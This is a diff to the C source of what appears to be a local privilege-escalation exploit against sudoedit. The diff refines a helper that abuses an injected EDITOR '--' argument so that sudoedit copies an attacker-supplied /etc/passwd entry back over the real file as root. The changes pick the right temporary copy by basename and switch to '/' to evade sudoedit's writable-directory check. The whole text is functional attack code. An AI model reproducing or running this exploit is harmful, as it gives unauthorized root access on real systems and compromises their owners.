@@ -291,14 +291,21 @@ static const char HELPER_SOURCE[] =
     "#include <unistd.h>\n"
     "#include <fcntl.h>\n"
     "int main(int argc, char **argv) {\n"
-    "    /* sudoedit invokes us with one editable temp per file. The\n"
-    "     * post-`--' target's editable copy is argv[argc-1]. We can't\n"
-    "     * write /etc/passwd directly (sudoedit edits a tmp copy and\n"
-    "     * then *copies it back as root*), so we modify the tmp copy\n"
-    "     * and let sudoedit do the privileged install for us. */\n"
+    "    /* sudoedit invokes us with one editable temp copy per file, each\n"
+    "     * named <basename>.XXXXXX in a tmp dir (e.g. /var/tmp/passwd.AbC123\n"
+    "     * for /etc/passwd). We must write the TARGET's copy — NOT argv[argc-1],\n"
+    "     * which is the sudoers-authorized cover file. Match by the target's\n"
+    "     * basename prefix (passed in SKEL_TARGET). We modify the tmp copy and\n"
+    "     * sudoedit copies it back over the real file as root. */\n"
     "    if (argc < 2) return 1;\n"
-    "    /* The LAST argv is the post-`--' target (per sudoedit's parser). */\n"
-    "    const char *path = argv[argc-1];\n"
+    "    const char *tb = getenv(\"SKEL_TARGET\"); if (!tb || !*tb) tb = \"passwd\";\n"
+    "    char pref[128]; snprintf(pref, sizeof pref, \"%s.\", tb);\n"
+    "    const char *path = NULL;\n"
+    "    for (int i = 1; i < argc; i++) {\n"
+    "        const char *b = strrchr(argv[i], '/'); b = b ? b+1 : argv[i];\n"
+    "        if (strncmp(b, pref, strlen(pref)) == 0) { path = argv[i]; break; }\n"
+    "    }\n"
+    "    if (!path) path = argv[argc-1];  /* fallback */\n"
     "    int fd = open(path, O_WRONLY|O_APPEND);\n"
     "    if (fd < 0) { perror(\"open\"); return 2; }\n"
     "    const char *line = getenv(\"SKEL_LINE\");\n"
@@ -441,6 +448,12 @@ static skeletonkey_result_t sudoedit_editor_exploit(const struct skeletonkey_ctx
     char skel_env[256];
     snprintf(skel_env, sizeof skel_env, "SKEL_LINE=%s", SK_PASSWD_ENTRY);
 
+    /* Pass the target's basename so the helper writes the RIGHT tmp copy
+     * (sudoedit names each editable copy <basename>.XXXXXX). */
+    const char *tb = strrchr(target, '/'); tb = tb ? tb + 1 : target;
+    char tgt_env[128];
+    snprintf(tgt_env, sizeof tgt_env, "SKEL_TARGET=%s", tb);
+
     /* Construct argv/envp for execve. We need a clean env so the
      * EDITOR string sudo sees is exactly ours. PATH is needed so the
      * compiled helper can be located — except we pass it absolute. */
@@ -455,6 +468,7 @@ static skeletonkey_result_t sudoedit_editor_exploit(const struct skeletonkey_ctx
     char *envp[] = {
         editor_env,
         skel_env,
+        tgt_env,
         "PATH=/usr/sbin:/usr/bin:/sbin:/bin",
         "TERM=dumb",
         NULL,
@@ -469,6 +483,13 @@ static skeletonkey_result_t sudoedit_editor_exploit(const struct skeletonkey_ctx
     pid = fork();
     if (pid < 0) { perror("fork"); goto fail; }
     if (pid == 0) {
+        /* CRITICAL: run from a NON-writable directory. sudoedit refuses to
+         * edit any file whose parent directory is writable by the invoking
+         * user (anti-symlink check). The injected "--" is resolved as a file
+         * relative to CWD, so a writable CWD (home/tmp) makes sudoedit abort
+         * with "--: editing files in a writable directory is not permitted"
+         * before it ever runs the editor. "/" is not user-writable. */
+        if (chdir("/") != 0) { perror("chdir /"); _exit(126); }
         execve(sudoedit_path, new_argv, envp);
         perror("execve(sudoedit)");
         _exit(127);
